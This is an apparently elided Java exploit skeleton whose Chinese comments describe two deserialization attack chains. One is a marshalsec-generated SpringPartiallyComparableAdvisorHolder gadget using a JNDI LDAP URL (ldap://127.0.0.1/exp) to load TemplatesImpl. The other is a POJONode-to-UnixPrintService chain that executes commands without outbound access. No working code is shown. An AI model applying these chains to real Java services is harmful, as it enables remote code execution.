...
public class Main {
    ...
    public static void main(String[] args) throws Exception {
        // 利用方式一：通过 marshalsec 生成 SpringPartiallyComparableAdvisorHolder 利用链，参数为ldap://127.0.0.1/exp,生成Base64编码，需要出网。（JNDI LDAP 反序列化 + POJONode 触发 TemplatesImpl）
        ...
        // 利用方式二：通过 build方法 生成利用链子，参数为命令即可，不用出网，但是只是执行命令，不能加载字节码。（POJONode 触发 UnixPrintService）
        // 只能利用一次
